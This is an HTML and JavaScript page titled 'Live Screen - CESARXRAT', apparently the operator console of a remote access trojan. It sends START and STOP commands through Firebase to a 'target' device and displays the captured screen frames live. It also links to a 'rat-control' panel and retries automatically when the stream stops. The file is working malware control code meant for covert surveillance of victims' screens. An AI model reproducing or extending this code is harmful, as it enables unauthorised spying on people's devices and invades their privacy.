<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Live Screen - CESARXRAT</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body {
            background: #000;
            color: #fff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            width: 100%;
            height: 100%;
            overflow: hidden;
            user-select: none;
            -webkit-user-select: none;
        }

        .top-bar {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            height: 56px;
            background: linear-gradient(180deg, rgba(0,0,0,0.85) 0%, rgba(0,0,0,0) 100%);
            display: flex;
            align-items: center;
            padding: 0 16px;
            z-index: 100;
        }
        .top-bar .back-btn {
            background: rgba(255,255,255,0.15);
            border: none;
            color: #fff;
            font-size: 20px;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: 0.2s;
        }
        .top-bar .back-btn:active {
            background: rgba(255,255,255,0.3);
        }
        .top-bar .title {
            flex: 1;
            text-align: center;
            font-size: 18px;
            font-weight: bold;
            color: #fff;
        }
        .top-bar .close-btn {
            background: rgba(255,255,255,0.15);
            border: none;
            color: #fff;
            font-size: 20px;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: 0.2s;
        }
        .top-bar .close-btn:active {
            background: rgba(255,255,255,0.3);
        }

        .live-badge {
            position: fixed;
            top: 68px;
            left: 16px;
            background: rgba(0,0,0,0.6);
            color: #ff4444;
            font-size: 12px;
            font-weight: bold;
            padding: 4px 12px;
            border-radius: 50px;
            display: none;
            align-items: center;
            gap: 6px;
            z-index: 100;
            letter-spacing: 1px;
        }
        .live-badge.show {
            display: flex;
        }
        .live-badge .dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #ff4444;
            animation: livePulse 1.2s infinite;
        }
        @keyframes livePulse {
            0% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.4; transform: scale(0.85); }
            100% { opacity: 1; transform: scale(1); }
        }

        #screenCanvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            z-index: 1;
            display: block;
        }

        .placeholder {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
            color: #888;
            font-size: 16px;
            padding: 20px;
            z-index: 2;
        }
        .placeholder .icon {
            font-size: 64px;
            display: block;
            margin-bottom: 16px;
            opacity: 0.5;
        }
        .placeholder.hide {
            display: none;
        }

        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            z-index: 200;
        }
        .loading-overlay.hide {
            display: none;
        }
        .loading-overlay .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid rgba(74, 158, 255, 0.3);
            border-top: 4px solid #4a9eff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-bottom: 16px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-overlay .text {
            color: #4a9eff;
            font-size: 14px;
        }

        .status-overlay {
            position: fixed;
            bottom: 24px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.7);
            color: #fff;
            padding: 8px 18px;
            border-radius: 50px;
            font-size: 12px;
            z-index: 100;
            display: flex;
            gap: 14px;
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
        }
        .status-overlay .item {
            display: flex;
            align-items: center;
            gap: 4px;
        }
        .status-overlay .item .label {
            color: #888;
        }
        .status-overlay .item .value {
            color: #4ae0a0;
            font-weight: bold;
        }

        .fps-box {
            position: fixed;
            bottom: 24px;
            right: 16px;
            background: rgba(0,0,0,0.7);
            color: #4ae0a0;
            padding: 6px 12px;
            border-radius: 50px;
            font-size: 11px;
            font-weight: bold;
            z-index: 100;
            font-family: 'Courier New', monospace;
        }
    </style>
</head>
<body>

    <canvas id="screenCanvas"></canvas>

    <div class="placeholder" id="placeholder">
        <span class="icon">🖥️</span>
        Menunggu layar target...
    </div>

    <div class="top-bar">
        <button class="back-btn" onclick="history.back()">←</button>
        <div class="title">Live Screen</div>
        <button class="close-btn" onclick="closeLiveScreen()">✕</button>
    </div>

    <div class="live-badge" id="liveBadge">
        <span class="dot"></span>
        <span>LIVE</span>
    </div>

    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
        <div class="text">Menghubungkan ke layar...</div>
    </div>

    <div class="status-overlay">
        <div class="item">
            <span class="label">Status:</span>
            <span class="value" id="statusState">Idle</span>
        </div>
    </div>

    <div class="fps-box" id="fpsBox">FPS: 0</div>

    <script type="module">
        import { db, ref, onValue, set } from './firebase-config.js';

        const urlParams = new URLSearchParams(window.location.search);
        const targetId = urlParams.get('target');

        if (!targetId) {
            alert('Target tidak ditemukan!');
            window.location.href = 'device-target.html';
        }

        const canvas = document.getElementById('screenCanvas');
        const ctx = canvas.getContext('2d');
        const placeholder = document.getElementById('placeholder');
        const liveBadge = document.getElementById('liveBadge');
        const loadingOverlay = document.getElementById('loadingOverlay');
        const statusState = document.getElementById('statusState');
        const fpsBox = document.getElementById('fpsBox');

        let frameCount = 0;
        let lastFpsTime = Date.now();
        let lastFrameTime = 0;
        let isStreaming = false;
        let retryCount = 0;

        // ===== SET CANVAS SIZE =====
        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        resizeCanvas();
        window.addEventListener('resize', resizeCanvas);

        // ===== DRAW FRAME =====
        function drawFrame(base64) {
            const img = new Image();
            img.onload = function() {
                try {
                    ctx.fillStyle = '#000';
                    ctx.fillRect(0, 0, canvas.width, canvas.height);

                    ctx.save();
                    ctx.translate(canvas.width / 2, canvas.height / 2);

                    // Skala supaya gambar muat
                    const canvasRatio = canvas.width / canvas.height;
                    const imgRatio = img.width / img.height;

                    let drawWidth, drawHeight;
                    if (imgRatio > canvasRatio) {
                        drawHeight = canvas.width;
                        drawWidth = drawHeight * imgRatio;
                    } else {
                        drawWidth = canvas.height;
                        drawHeight = drawWidth / imgRatio;
                    }

                    ctx.drawImage(
                        img,
                        -drawWidth / 2,
                        -drawHeight / 2,
                        drawWidth,
                        drawHeight
                    );

                    ctx.restore();

                    if (placeholder) placeholder.classList.add('hide');

                } catch (e) {
                    console.error('[LiveScreen] Draw error:', e);
                }
            };
            img.onerror = function() {
                console.error('[LiveScreen] Image load error');
            };
            img.src = 'data:image/jpeg;base64,' + base64;
        }

        function startStreaming() {
            console.log('[LiveScreen] Sending START');
            set(ref(db, 'targets/' + targetId + '/live_screen/command'), 'START');
        }

        function stopStreaming() {
            console.log('[LiveScreen] STOP');
            set(ref(db, 'targets/' + targetId + '/live_screen/command'), 'STOP');
        }

        // ===== START saat halaman dibuka =====
        console.log('[LiveScreen] Page loaded, target:', targetId);
        loadingOverlay.classList.remove('hide');
        startStreaming();

        // ===== LISTEN STATUS =====
        onValue(ref(db, 'targets/' + targetId + '/live_screen/status'), (snap) => {
            const status = snap.val() || 'idle';
            statusState.textContent = status;

            if (status === 'streaming') {
                liveBadge.classList.add('show');
                loadingOverlay.classList.add('hide');
                isStreaming = true;
                retryCount = 0;
            } else if (status === 'idle') {
                liveBadge.classList.remove('show');
                loadingOverlay.classList.remove('hide');
                isStreaming = false;

                if (retryCount < 3) {
                    retryCount++;
                    setTimeout(() => {
                        if (!isStreaming) startStreaming();
                    }, 2000);
                }
            } else {
                liveBadge.classList.remove('show');
                loadingOverlay.classList.remove('hide');
                isStreaming = false;
            }
        });

        // ===== LISTEN FRAME =====
        onValue(ref(db, 'targets/' + targetId + '/live_screen/current_frame'), (snap) => {
            const base64 = snap.val();
            if (!base64 || base64.length < 100) return;

            drawFrame(base64);

            lastFrameTime = Date.now();

            frameCount++;
            const now = Date.now();
            if (now - lastFpsTime >= 1000) {
                const fps = Math.round(frameCount * 1000 / (now - lastFpsTime));
                fpsBox.textContent = 'FPS: ' + fps;
                frameCount = 0;
                lastFpsTime = now;
            }
        });

        // ===== AUTO-RESTART kalau frame timeout =====
        setInterval(() => {
            if (!isStreaming) return;

            const now = Date.now();
            if (lastFrameTime > 0 && (now - lastFrameTime) > 10000) {
                console.log('[LiveScreen] Frame timeout, restart...');
                liveBadge.classList.remove('show');
                loadingOverlay.classList.remove('hide');
                isStreaming = false;
                startStreaming();
            }
        }, 5000);

        // ===== CLOSE =====
        window.closeLiveScreen = function() {
            stopStreaming();
            setTimeout(() => {
                window.location.href = 'rat-control.html?target=' + targetId;
            }, 300);
        };

        window.addEventListener('beforeunload', () => {
            stopStreaming();
        });

        console.log('[CESARXRAT] Live Screen page loaded, target:', targetId);
    </script>
</body>
</html>
